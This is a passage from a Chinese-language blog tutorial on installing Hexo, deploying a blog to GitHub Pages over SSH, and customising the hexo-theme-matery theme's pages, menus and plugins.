rel="noopener">Node.js官网</a>下载<code>.exe</code>文件，安装选项全部默认。安装好之后，按<code>Win+R</code>打开cmd命令提示符，输入<code>node -v</code>和<code>npm -v</code>，若出现版本号，则说明安装成功。</p><h3 id="3-添加npm国内源"><a href="#3-添加npm国内源" class="headerlink" title="3. 添加npm国内源"></a>3. 添加npm国内源</h3><p>使用阿里的国内镜像进行加速下载</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-安装Hexo"><a href="#4-安装Hexo" class="headerlink" title="4. 安装Hexo"></a>4. 安装Hexo</h3><p>前面<code>git</code>和<code>nodejs</code>安装好后，就可以安装<code>hexo</code>了，你可以先创建一个文件夹<code>MyBlog</code>，用来存放自己的博客文件，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接右键<code>git bash</code>打开）。</p><p>比如我的博客文件都存放在<code>E:\MyBlog</code>目录下。</p><p>在该目录下右键点击<code>Git Bash Here</code>，打开<code>git</code>的控制台窗口，以后我们所有的操作都在<code>git</code>控制台进行，就不用<code>Windows</code>自带的<code>cmd</code>了。</p><p>定位到该目录下，输入<code>npm install -g hexo-cli</code>安装<code>Hexo</code>。可能会有几个报错，不用理会。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完后输入<code>hexo -v</code>验证是否安装成功。</p><p>到此为止<code>hexo</code>就安装完了。</p><p>接下来初始化一下<code>hexo</code>,即初始化我们的网站，输入<code>hexo init</code>初始化文件夹</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init MyBlog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>新建完成后，指定文件夹<code>MyBlog</code>目录下有：</p><ul><li><code>node_modules</code>: 依赖包</li><li><code>public</code>：存放生成的页面</li><li><code>scaffolds</code>：生成文章的一些模板</li><li><code>source</code>：用来存放你的文章</li><li><code>themes</code>：主题**</li><li><code>_config.yml</code>: 博客的配置文件**</li></ul><p>到此为止，本地的网站配置完成了。</p><p>输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>打开本地服务器</p><pre class="line-numbers language-bash"><code class="language-bash">hexo ghexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s1.ax1x.com/2020/03/12/8VdlGD.png" alt=""></p><h3 id="5-注册Github账号创建个人仓库"><a href="#5-注册Github账号创建个人仓库" class="headerlink" title="5. 注册Github账号创建个人仓库"></a>5. 注册Github账号创建个人仓库</h3><p>接下来就去注册一个<code>github</code>账号，用来存放我们的网站。</p><p>打开<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>，新建一个项目仓库<code>New repository</code>，如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s1.ax1x.com/2020/03/12/8VwrtK.png" alt=""></p><p>然后如下图所示，输入自己的项目名字，后面一定要加<code>.github.io</code>后缀，README初始化也要勾上</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s1.ax1x.com/2020/03/12/8VdoQJ.png" alt=""></p><blockquote><p>要创建一个和你用户名相同的仓库，后面加<code>.github.io</code>，只有这样，将来要部署到<code>GitHub page</code>的时候，才会被识别，也就是<code>http://xxxx.github.io</code>，其中xxx就是你注册<code>GitHub</code>的用户名。例如我的：<code>http://LuckyZmj.github.io</code></p></blockquote><h3 id="6-生成SSH添加到GitHub"><a href="#6-生成SSH添加到GitHub" class="headerlink" title="6. 生成SSH添加到GitHub"></a>6. 生成SSH添加到GitHub</h3><p>生成<code>SSH</code>添加到<code>GitHub</code>，连接<code>Github</code>与本地。<br>右键打开<code>git bash here</code>，然后输入下面命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"注册GitHub用户名"</span><span class="token function">git</span> config --global user.email <span class="token string">"注册GitHub的邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用以下两条，检查一下你有没有输对</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> config user.name<span class="token function">git</span> config user.email<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后创建<code>SSH</code>,一路回车</p><pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"注册GitHub的邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候它会告诉你已经生成了<code>.ssh</code>的文件夹。在<code>git bash</code>中输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> ~/.ssh/id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将输出的内容复制到框中，点击确定保存。</p><p>打开<code>github</code>，在头像下面点击<code>settings</code>，再点击<code>SSH and GPG keys</code>，新建一个<code>SSH</code>，名字随便取一个都可以，把你的<code>id_rsa.pub</code>里面的信息复制进去。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s1.ax1x.com/2020/03/12/8Vwnyj.png" alt=""></p><p>在<code>git bash</code>输入<code>ssh -T git@github.com</code>，如果如下图所示，出现你的用户名，那就成功了。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-将hexo部署到GitHub"><a href="#7-将hexo部署到GitHub" class="headerlink" title="7. 将hexo部署到GitHub"></a>7. 将hexo部署到GitHub</h3><p>将<code>hexo</code>生成的文章部署到<code>GitHub</code>上，打开博客根目录下的<code>_config.yml</code>文件，这是博客的配置文件，在这里你可以修改与博客配置相关的各种信息。<br>找到如下配置进行修改：</p><pre class="line-numbers language-bash"><code class="language-bash">deploy:  type: <span class="token function">git</span>  repository: https://github.com/LuckyZmj/LuckyZmj.github.io  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>repository</code>修改为你自己的<code>github</code>项目地址即可，就是部署时，告诉工具，将生成网页通过<code>git</code>方式上传到你对应的链接仓库中。</p><p>这个时候需要先安装<code>deploy-git</code> ，也就是部署的命令,这样你才能用命令部署到<code>GitHub</code>。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就可以部署提交到<code>github</code>，过一会儿就可以在<code>http://yourname.github.io</code> 这个网站看到你的博客了</p><pre class="line-numbers language-bash"><code class="language-bash">hexo cleanhexo generatehexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中 <code>hexo clean</code>清除了你之前生成的东西。 <code>hexo generate</code>，生成静态文章，可以用 <code>hexo g</code>缩写 ，<code>hexo deploy</code>部署文章，可以用<code>hexo d</code>缩写</p><blockquote><p>注意<code>deploy</code>时可能要你输入<code>username</code>和<code>password</code>。</p></blockquote><h3 id="8-写文章和发布文章"><a href="#8-写文章和发布文章" class="headerlink" title="8. 写文章和发布文章"></a>8. 写文章和发布文章</h3><p>首先在博客根目录下右键打开<code>git bash here</code>，安装一个扩展<code>npm i hexo-deployer-git</code>。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> i hexo-deployer-git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后输入<code>hexo new post "article title"</code>，新建一篇文章。</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new post <span class="token string">"article title"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后打开<code>E:\MyBlog\source\_posts</code>的目录，可以发现下面多了一个文件夹和一个<code>.md</code>文件，一个用来存放你的图片等数据，另一个就是你的文章文件。</p><p>另外推荐直接使用<code>有道云</code>编写<code>markdown</code>文章，不仅可以实时预览，还可以快捷的生成<code>markdown</code>语法格式，具体效果如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s1.ax1x.com/2020/03/12/8VwItf.png" alt="有道云"></p><p>编写完<code>markdown</code>文件后，根目录下输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>可以本地预览效果，最后输入<code>hexo d</code>上传到<code>github</code>上。这时打开你的<code>github.io</code>主页就能看到发布的文章了。</p><p>到此为止，<code>Hexo</code>初级搭建就已经完成了。</p><h2 id="0x004-Hexo-优化定制"><a href="#0x004-Hexo-优化定制" class="headerlink" title="0x004 Hexo 优化定制"></a>0x004 Hexo 优化定制</h2><hr><h3 id="1-Hexo相关目录文件"><a href="#1-Hexo相关目录文件" class="headerlink" title="1. Hexo相关目录文件"></a>1. Hexo相关目录文件</h3><h4 id="1-1-博客目录构成介绍"><a href="#1-1-博客目录构成介绍" class="headerlink" title="1.1 博客目录构成介绍"></a>1.1 博客目录构成介绍</h4><p><code>node_modules</code>是<code>node.js</code>各种库的目录，<code>public</code>是生成的网页文件目录，<code>scaffolds</code>里面就三个文件，存储着新文章和新页面的初始设置，<code>source</code>是我们最常用到的一个目录，里面存放着文章、各类页面、图像等文件，<code>themes</code>存放着主题文件，一般也用不到。</p><p>我们平时写文章只需要关注<code>source/_posts</code>这个文件夹就行了。</p><pre class="line-numbers language-bash"><code class="language-bash">- node_modules- public- scaffolds- <span class="token function">source</span>    - _data    - _posts    - about    - archives    - categories    - friends    - tags- themes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-hexo基本配置"><a href="#1-2-hexo基本配置" class="headerlink" title="1.2 hexo基本配置"></a>1.2 hexo基本配置</h4><p>在文件根目录下的<code>_config.yml</code>，就是整<code>个hexo</code>框架的配置文件了。可以在里面修改大部分的配置。详细可参考官方的<a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">配置描述</a>。</p><h5 id="1-2-1-网站"><a href="#1-2-1-网站" class="headerlink" title="1.2.1 网站"></a>1.2.1 网站</h5><p>参数描述<code>title</code>网站标题<code>subtitle</code>网站副标题<code>description</code>网站描述<code>author</code>您的名字<code>language</code>网站使用的语言<code>timezone</code>网站时区。<code>Hexo</code> 默认使用您电脑的时区。时区列表。比如说：<code>America/New_York</code>, <code>Japan</code>, 和 <code>UTC</code> 。</p><p>其中，<code>description</code>主要用于<code>SEO</code>，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。<code>author</code>参数用于主题显示文章的作者。</p><h5 id="1-2-2-网址"><a href="#1-2-2-网址" class="headerlink" title="1.2.2 网址"></a>1.2.2 网址</h5><p>参数描述<code>url</code>网址<code>root</code>网站根目录 <code>permalink</code>文章的<a href="https://hexo.io/zh-cn/docs/permalinks" target="_blank" rel="noopener">永久链接</a>格式<code>permalink_defaults</code>永久链接中各部分的默认值</p><p>在这里，你需要把<code>url</code>改成你的网站域名。</p><p><code>permalink</code>，也就是你生成某个文章时的那个链接格式。</p><p>比如我新建一个文章叫<code>temp.md</code>，那么这个时候他自动生成的地址就是<code>http://yoursite.com/2018/09/05/temp</code>。</p><p>以下是官方给出的示例，关于链接的变量还有很多，需要的可以去官网上查找<a href="https://hexo.io/zh-cn/docs/permalinks" target="_blank" rel="noopener">永久链接</a> 。</p><pre class="line-numbers language-bash"><code class="language-bash">参数结果:year/:month/:day/:title       /2019/08/10/hello-world :year-:month-:day-:title.html  2019-08-10-hello-world.html :category/:titlefoo            /bar/hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-定制主题"><a href="#2-定制主题" class="headerlink" title="2. 定制主题"></a>2. 定制主题</h3><p>这里推荐作者<code>洪卫</code>的<a href="https://github.com/shw2018/hexo-blog-fly.git" target="_blank" rel="noopener">hexo-blog-fly</a>博客主题，该主题是基于<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">hexo-theme-matery</a>优化的，需要把博客相关信息换成您自己的就可以部署了，极大简化了构建博客的工作量和复杂度。</p><h4 id="2-1-简单使用方法"><a href="#2-1-简单使用方法" class="headerlink" title="2.1 简单使用方法"></a>2.1 简单使用方法</h4><ol><li>安装<code>Git</code>, 安装<code>nodeJS</code>，安装<code>Hexo</code></li><li>你可以直接<code>fork</code>一份源码到你的仓库，<code>clone</code>到本地博客文件夹内</li><li>在本地博客仓库运行<code>npm i</code>命令安装依赖包</li><li>直接修改配置信息，改成自己的信息</li><li>运行命令<code>hexo clean</code>（清除生成文件），<code>hexo g</code>（生成网页）， <code>hexo s</code>（本地预览），<code>hexo d</code>（部署）</li></ol><h4 id="2-2-原主题特性"><a href="#2-2-原主题特性" class="headerlink" title="2.2 原主题特性:"></a>2.2 原主题特性:</h4><ul><li>简单漂亮，文章内容美观易读</li><li><a href="https://material.io/" target="_blank" rel="noopener">Material Design</a> 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 <code>MathJax</code></li><li><code>TOC</code> 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li><a href="https://gitalk.github.io/" target="_blank" rel="noopener">Gitalk</a>、<a href="https://imsun.github.io/gitment/" target="_blank" rel="noopener">Gitment</a>、<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 和 <a href="https://disqus.com/" target="_blank" rel="noopener">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li><li>集成了<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li></ul><h4 id="2-3-新增加特性"><a href="#2-3-新增加特性" class="headerlink" title="2.3 新增加特性:"></a>2.3 新增加特性:</h4><ul><li>修改了原主题的一些很多bug</li><li>加入图片懒加载功能，在根目录配置文件开启和关闭</li><li>增加留言板功能</li><li>在关于板块,加入简历功能页</li><li>增加视听[视觉听觉影音]板块 </li><li>支持emoji表情，用markdown emoji语法书写直接生成对应的能跳跃的表情。</li><li>增加网站运行时间显示 </li><li>增加动漫模型 </li><li>整体替换Banner图片和文章特色图片</li><li>增加分类相册功能</li><li>修改了一些控件的参数</li><li>修改部分样式,比如: 文章卡片,固定高度,使其不至于因为文章摘要的长短不同导致卡片大小不一使页面布局很不美观,类似的还有友链卡片,优化了页面内容布局,视觉更整齐美观</li><li>解决首页文章列表卡片上方 border-radius圆角失效的bug</li><li>添加页面樱花飘落动效</li><li>添加鼠标点击烟花爆炸动效</li><li>加入天气接口控件</li><li>加入鼠标点击文字特效</li><li>添加页面雪花飘落动效</li><li>添加在线聊天插件</li><li>调整线聊天插件参数，使之能够随着鼠标滑动位置自适应调整</li><li>持续更新…</li></ul><hr><h4 id="2-4-切换主题"><a href="#2-4-切换主题" class="headerlink" title="2.4 切换主题"></a>2.4 切换主题</h4><p>如果想自己动手对<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">hexo-theme-matery</a>优化的话，可以修改Hexo根目录下的<code>_config.yml</code>的 <code>theme</code> 的值</p><pre class="line-numbers language-bash"><code class="language-bash">theme: hexo-theme-matery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>_config.yml</code> 文件的其它修改建议:</p><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 6 的倍数，如：12、18 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h4 id="2-5-新建分类-categories-页"><a href="#2-5-新建分类-categories-页" class="headerlink" title="2.5 新建分类 categories 页"></a>2.5 新建分类 categories 页</h4><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"categories"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash">---title: categoriesdate: 2018-09-30 17:25:30type: <span class="token string">"categories"</span>layout: <span class="token string">"categories"</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-6-新建标签-tags-页"><a href="#2-6-新建标签-tags-页" class="headerlink" title="2.6 新建标签 tags 页"></a>2.6 新建标签 tags 页</h4><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"tags"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash">---title: tagsdate: 2018-09-30 18:23:38type: <span class="token string">"tags"</span>layout: <span class="token string">"tags"</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-7-新建关于我-about-页"><a href="#2-7-新建关于我-about-页" class="headerlink" title="2.7 新建关于我 about 页"></a>2.7 新建关于我 about 页</h4><p><code>about</code> 页是用来展示关于我和我的博客信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"about"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash">---title: aboutdate: 2018-09-30 17:25:30type: <span class="token string">"about"</span>layout: <span class="token string">"about"</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-8-新建留言板-contact-页（可选的）"><a href="#2-8-新建留言板-contact-页（可选的）" class="headerlink" title="2.8 新建留言板 contact 页（可选的）"></a>2.8 新建留言板 contact 页（可选的）</h4><p><code>contact</code> 页是用来展示留言板信息的页面，前提是已经开启了第三方评论系统才能显示。如果在你的博客 <code>source</code> 目录下还没有 <code>contact/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"contact"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/contact/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash">---title: contactdate: 2018-09-30 17:25:30type: <span class="token string">"contact"</span>layout: <span class="token string">"contact"</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-9-新建友情链接-friends-页（可选的）"><a href="#2-9-新建友情链接-friends-页（可选的）" class="headerlink" title="2.9 新建友情链接 friends 页（可选的）"></a>2.9 新建友情链接 friends 页（可选的）</h4><p><code>friends</code> 页是用来展示友情链接信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new page <span class="token string">"friends"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash">---title: friendsdate: 2018-12-12 21:25:30type: <span class="token string">"friends"</span>layout: <span class="token string">"friends"</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token punctuation">{</span>    <span class="token string">"avatar"</span><span class="token keyword">:</span> <span class="token string">"http://image.luokangyuan.com/1_qq_27922023.jpg"</span>,    <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"码酱"</span>,    <span class="token string">"introduction"</span><span class="token keyword">:</span> <span class="token string">"我不是大佬，只是在追寻大佬的脚步"</span>,    <span class="token string">"url"</span><span class="token keyword">:</span> <span class="token string">"http://luokangyuan.com/"</span>,    <span class="token string">"title"</span><span class="token keyword">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">}</span>, <span class="token punctuation">{</span>    <span class="token string">"avatar"</span><span class="token keyword">:</span> <span class="token string">"http://image.luokangyuan.com/4027734.jpeg"</span>,    <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"闪烁之狐"</span>,    <span class="token string">"introduction"</span><span class="token keyword">:</span> <span class="token string">"编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬"</span>,    <span class="token string">"url"</span><span class="token keyword">:</span> <span class="token string">"https://blinkfox.github.io/"</span>,    <span class="token string">"title"</span><span class="token keyword">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">}</span>, <span class="token punctuation">{</span>    <span class="token string">"avatar"</span><span class="token keyword">:</span> <span class="token string">"http://image.luokangyuan.com/avatar.jpg"</span>,    <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"ja_rome"</span>,    <span class="token string">"introduction"</span><span class="token keyword">:</span> <span class="token string">"平凡的脚步也可以走出伟大的行程"</span>,    <span class="token string">"url"</span><span class="token keyword">:</span> <span class="token string">"https://me.csdn.net/jlh912008548"</span>,    <span class="token string">"title"</span><span class="token keyword">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-10-一级菜单导航配置"><a href="#2-10-一级菜单导航配置" class="headerlink" title="2.10 一级菜单导航配置"></a>2.10 一级菜单导航配置</h4><p>配置基本菜单导航的名称、路径<code>url</code>和图标<code>icon</code></p><ul><li>菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或主页) </li><li>图标<code>icon</code> 可以在<code>Font Awesome</code> 中查找</li></ul><pre class="line-numbers language-bash"><code class="language-bash">menu:  Index:    url: /    icon: fas fa-home  Tags:    url: /tags    icon: fas fa-tags  Categories:    url: /categories    icon: fas fa-bookmark  Archives:    url: /archives    icon: fas fa-archive  About:    url: /about    icon: fas fa-user-circle  Friends:    url: /friends    icon: fas fa-address-book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-11-二级菜单配置方法"><a href="#2-11-二级菜单配置方法" class="headerlink" title="2.11 二级菜单配置方法"></a>2.11 二级菜单配置方法</h4><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作</p><ul><li>在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)</li><li>在<code>children</code>下创建二级菜单的 名称<code>name</code>,路径<code>url</code>和图标<code>icon</code>.</li><li>注意每个二级菜单模块前要加 -.</li><li>注意缩进格式</li></ul><pre class="line-numbers language-bash"><code class="language-bash">menu:  Index:    url: /    icon: fas fa-home  Tags:    url: /tags    icon: fas fa-tags  Categories:    url: /categories    icon: fas fa-bookmark  Archives:    url: /archives    icon: fas fa-archive  About:    url: /about    icon: fas fa-user-circle-o  Friends:    url: /friends    icon: fas fa-address-book  Medias:    icon: fas fa-list    children:      - name: Musics        url: /musics        icon: fas fa-music      - name: Movies        url: /movies        icon: fas fa-film      - name: Books        url: /books        icon: fas fa-book      - name: Galleries        url: /galleries        icon: fas fa-image<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean</code> &amp;&amp; <code>hexo g</code> 重新生成博客文件。</p><h4 id="2-12-代码高亮"><a href="#2-12-代码高亮" class="headerlink" title="2.12 代码高亮"></a>2.12 代码高亮</h4><p>由于 <code>Hexo</code> 自带的代码高亮主题显示不好看，所以主题中使用到了 <code>hexo-prism-plugin</code> 的 <code>Hexo</code> 插件来做代码高亮，安装命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> i -S hexo-prism-plugin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，修改 <code>Hexo</code> 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p><pre class="line-numbers language-bash"><code class="language-bash">highlight:  enable: <span class="token boolean">false</span>prism_plugin:  mode: <span class="token string">'preprocess'</span>    <span class="token comment" spellcheck="true"># realtime/preprocess</span>  theme: <span class="token string">'tomorrow'</span>  line_number: <span class="token boolean">false</span>    <span class="token comment" spellcheck="true"># default false</span>  custom_css:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>更多代码块优化详细内容请访问：<a href="http://luckyzmj.cn/posts/1b9a9e28.html" target="_blank" rel="noopener">http://luckyzmj.cn/posts/1b9a9e28.html</a></p></blockquote><h4 id="2-13-搜索"><a href="#2-13-搜索" class="headerlink" title="2.13 搜索"></a>2.13 搜索</h4><p>本主题中还使用到了 <code>hexo-generator-search</code> 的 <code>Hexo</code> 插件来做内容搜索，安装命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>Hexo</code> 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-bash"><code class="language-bash">search:  path: search.xml  field: post<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2-14-文章字数统计插件（建议安装）"><a href="#2-14-文章字数统计插件（建议安装）" class="headerlink" title="2.14 文章字数统计插件（建议安装）"></a>2.14 文章字数统计插件（建议安装）</h4><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <code>hexo-wordcount</code> 插件。</p><p>安装命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> i --save hexo-wordcount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p><pre class="line-numbers language-bash"><code class="language-bash">postInfo:  date: <span class="token boolean">true</span>  update: <span class="token boolean">false</span>  wordCount: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 设置文章字数统计为 true.</span>  totalCount: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 设置站点文章总字数统计为 true.</span>  min2read: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 阅读时长.</span>  readCount: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 阅读次数.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-15-添加emoji表情支持（可选的）"><a href="#2-15-添加emoji表情支持（可选的）" class="headerlink" title="2.15 添加emoji表情支持（可选的）"></a>2.15 添加emoji表情支持（可选的）</h4><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 <code>hexo-filter-github-emojis</code> 的 <code>Hexo</code> 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown</code> <code>emoji</code>语法（::,例如：<code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-filter-github-emojis --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>Hexo</code> 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-bash"><code class="language-bash">githubEmojis:  enable: <span class="token boolean">true</span>  className: github-emoji  inject: <span class="token boolean">true</span>  styles:  customEmojis:<span aria-hidden="true" 